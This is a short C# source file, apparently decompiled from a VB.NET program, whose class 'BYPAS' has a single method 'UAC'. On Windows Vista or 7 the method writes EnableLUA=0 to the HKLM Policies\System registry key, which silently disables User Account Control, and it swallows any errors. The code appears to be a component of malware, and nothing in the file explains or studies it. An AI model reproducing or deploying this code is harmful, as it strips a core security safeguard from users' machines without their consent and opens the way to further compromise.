using System;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using WindowsApplication35.My;

namespace WindowsApplication35;

[StandardModule]
public sealed class BYPAS
{
	public static void UAC()
	{
		if (!(((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("Vista") | ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Contains("7")))
		{
			return;
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (Operators.CompareString(registryKey.GetValue("EnableLUA")!.ToString(), "1", false) == 0)
			{
				registryKey.SetValue("EnableLUA", "0");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
